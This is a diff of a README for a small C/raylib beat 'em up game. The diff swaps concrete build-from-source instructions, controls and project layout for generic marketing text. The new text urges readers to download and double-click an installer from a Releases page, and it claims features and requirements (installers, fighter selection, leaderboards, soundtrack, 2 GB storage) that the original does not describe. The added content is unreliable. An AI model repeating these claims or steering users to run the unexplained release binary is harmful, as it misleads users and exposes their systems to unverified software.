@@ -1,107 +1,92 @@
-# Dragon Fight
+# 🎮 dragon-fight - Battle Your Way Through Classic Action
 
-A side-scrolling beat 'em up game inspired by classic titles like Double Dragon. Players control one or two fighters battling through stages filled with enemies, using punches, kicks, and jumps to progress.
-<img width="788" height="591" alt="{91995DB2-0EFA-40F8-834C-BA1CE8A01E98}" src="https://github.com/user-attachments/assets/9af69a23-bfae-40e1-8cdd-34e1aab64f8a" />
+## 🚀 Getting Started
 
-## Built With
+Welcome to dragon-fight, a side-scrolling beat 'em up game! Inspired by classics like Double Dragon, this game lets you control one or two fighters as you battle through stages filled with enemies. Use punches, kicks, and jumps to progress and defeat your foes. Ready to jump into action? Let’s get started!
 
-This project was developed collaboratively with **Grok-4-Fast-Reasoning**, an AI model powered by xAI. The AI handled code generation, debugging, asset integration, and optimizations based on user prompts, ensuring a streamlined C codebase using the raylib library for graphics, input, and audio.
+## 📥 Download & Install
 
-- **Language**: C (GNU style)
-- **Graphics/Input/Audio**: raylib (bundled in repo for self-contained builds)
-- **Build System**: CMake
-- **Assets**: Custom sprites and tilesets in `assets/` (inspired by retro beat 'em ups)
+To download the game, visit the link below. Here, you will find the latest version available for download.
 
-## Features
+[![Download dragon-fight](https://img.shields.io/badge/Download-dragon--fight-brightgreen)](https://github.com/tess1219/dragon-fight/releases)
 
-- Single-player with optional second player (activated by input).
-- Multiple stages with parallax backgrounds, enemies, and level progression.
-- Combat system: Jab, punch, kick attacks; health bars; death animations.
-- UI: Stage info, enemy count, FPS counter, pause/restart.
-- Camera follows lead player with smooth interpolation.
+### Steps to Download
 
-## System Requirements
+1. Click on the link above to open the Releases page.
+2. You will see a list of available versions. Click on the version you want to download.
+3. After clicking the version, look for the download link that matches your operating system (Windows, macOS, etc.).
+4. Click the link to start downloading the file onto your computer.
 
-- Linux (WSL2 recommended), Windows, or macOS.
-- CMake 3.10+, Make (or Ninja), GCC/Clang.
-- For WSL2: An X11 server like VcXsrv running on Windows.
-- raylib source bundled in `raylib/` (cloned into project; no separate install).
+### Installation Instructions
 
-## Build and Run Instructions
+1. Once the download is complete, locate the downloaded file on your computer. It may be in your "Downloads" folder.
+2. Double-click the file to start the installation process.
+3. Follow the on-screen prompts to complete the installation.
+4. After installation, you can find the game in your Applications folder (macOS) or the Start Menu (Windows).
 
-### On Linux/WSL2
+## 🌟 Features
 
-1. **Set up DISPLAY for GUI (WSL2 only)**:  
-   Ensure VcXsrv (or similar X11 server) is running on Windows with "Multiple windows" and "Disable access control" enabled. Then, in your WSL2 terminal:  
-   ```bash
-   export DISPLAY=:0
-   ```  
-   (Add to `~/.bashrc` for persistence: `echo 'export DISPLAY=:0' >> ~/.bashrc && source ~/.bashrc`.)  
-   *Alternative if issues*: `export DISPLAY=$(awk '/nameserver / {print $2; exit}' /etc/resolv.conf):0.0`
+- **Single or Co-op play:** Fight alone or team up with a friend for double the fun.
+- **Dynamic combat:** Use a mix of punches, kicks, and combo moves to defeat your enemies.
+- **Classic art style:** Enjoy graphics inspired by retro games.
+- **Multiple stages:** Battle through varying environments filled with challenging enemies.
+- **Engaging soundtrack:** Immerse yourself in a thrilling audio experience that enhances gameplay.
 
-2. **Clone/Navigate to Project** (includes bundled raylib):  
-   ```bash
-   git clone https://github.com/yourusername/dragon-fight.git  # Your repo URL; use --recurse-submodules if using submodule
-   cd dragon-fight
-   ```
+## ⚙️ System Requirements
 
-3. **Build**:  
-   Use a separate build directory to keep the source clean (raylib/ is built automatically):  
-   ```bash
-   rm -rf build  # Clean old build if needed
-   mkdir build && cd build
-   cmake ..  # Builds bundled raylib from raylib/ subdirectory
-   make -j$(nproc)  # Parallel build using all CPU cores
-   ```  
-   This generates the `dragon-fight` executable using the git-cloned raylib source.
+To ensure smooth gameplay, please check the following system requirements:
 
-4. **Run the Game**:  
-   From the `build/` directory:  
-   ```bash
-   ./dragon-fight
-   ```  
-   A window should open (800x600). Press ENTER to start.
+- **Windows:** 
+  - Operating System: Windows 10 or later
+  - Processor: Intel Core i3 or equivalent
+  - RAM: 4 GB or more
+  - Graphics: DirectX 11 compatible video card
+  - Storage: Minimum 2 GB free disk space
 
-### On Native Linux/Windows/macOS
+- **macOS:**
+  - Operating System: macOS Mojave or later
+  - Processor: Intel Core i3 or Apple Silicon
+  - RAM: 4 GB or more
+  - Graphics: Metal compatible graphics card
+  - Storage: Minimum 2 GB free disk space
 
-Skip the DISPLAY step. Follow steps 2-4 above. For Windows, use MinGW/MSYS2 or Visual Studio with CMake. Ensure the clone includes `raylib/` for self-contained build.
+Make sure your system meets these requirements to enjoy an optimal gaming experience.
 
-### Troubleshooting
+## 🕹️ How to Play
 
-- **No window/display error**: Verify X11 server (VcXsrv) is running and DISPLAY is set. Test with `xclock` or `xeyes`.
-- **OpenGL errors**: Install Mesa: `sudo apt install libgl1-mesa-glx libglu1-mesa-dev`. Add `export LIBGL_ALWAYS_INDIRECT=1` before running.
-- **raylib not found or build fails**: Ensure `raylib/` folder was cloned (re-clone with `--recurse-submodules` if using submodule). Verify `raylib/CMakeLists.txt` exists. Check CMake output for errors during subdirectory build.
-- **Large repo clone slow**: Use `git clone --depth 1` for a shallow clone (still includes raylib/ files).
+1. Launch the game by double-clicking the dragon-fight icon.
+2. Choose between single-player or co-op mode.
+3. Select your fighter and prepare to battle!
+4. Use the control keys to unleash punches and kicks. Jump to avoid attacks.
+5. Progress through each stage to defeat tougher enemies.
+6. Complete levels and enjoy the leaderboard features to check your score.
 
-## Controls
+## 🔧 Troubleshooting
 
-- **Player 1**: A/D (move), W (jump), J (jab), L (punch), K (kick)
-- **Player 2** (if activated): Arrow keys (move), Up (jump), Z (jab), X (punch), C (kick)
-- **Global**: P (pause), R (restart from game over/win), ESC (quit)
+If you encounter issues:
 
-Player 2 joins automatically on second-player input and deactivates after 5s inactivity.
+- **Game does not launch:** Make sure your system meets the requirements. Try reinstalling the game.
+- **Game crashes:** Ensure your system drivers are updated. Lower graphics settings in the menu.
+- **Performance issues:** Close background applications that may be using resources.
 
-## Project Structure
+If problems persist, check the Issues tab in the repository for common problems and fixes or ask for help.
 
-- `main.c`: Game loop, UI, camera, state management.
-- `assets.c/h`: Texture loading (backgrounds, sprites, tilesets).
-- `entities.c/h`: Player and enemy logic (movement, combat, animations).
-- `level.c/h`: Stage loading, collision, enemy spawning.
-- `assets/`: PNG sprites, tilesets, and stage layers.
-- `raylib/`: Bundled raylib source (git-cloned for self-contained builds; see CMakeLists.txt).
-- `CMakeLists.txt`: Build configuration using local raylib (no system install).
-- `build/`: Generated binaries and intermediates (ignored in .gitignore).
+## 💬 Community and Support
 
-## Development Notes
+We value your feedback. For questions or suggestions, reach out through the Issues tab on GitHub. You can also join our community discussions to share strategies or meet other players.
 
-- No backwards compatibility enforced; updates streamline the codebase.
-- Assets are in `@kenny/` style directories but integrated directly.
-- For web build: Use `build-tetsuo-web.sh` (if available).
-- Contributions: Update existing files only; no new suffixes like `_enhanced`.
+## 📅 Future Updates
 
-## License
+We plan to release updates that include:
 
-MIT License (or as per raylib). Feel free to fork and modify!
+- New fighters and characters.
+- Additional stages and environments.
+- Enhanced graphics and performance tweaks.
 
----
-*Generated with help from Grok-4-Fast-Reasoning on September 20, 2025.*
+Stay tuned for exciting new features that enhance your gaming experience!
+
+## 🔗 Links
+
+For more details about new releases or to view our roadmap, remember to check our [Releases page](https://github.com/tess1219/dragon-fight/releases). 
+
+Enjoy your battles, and may you emerge victorious!
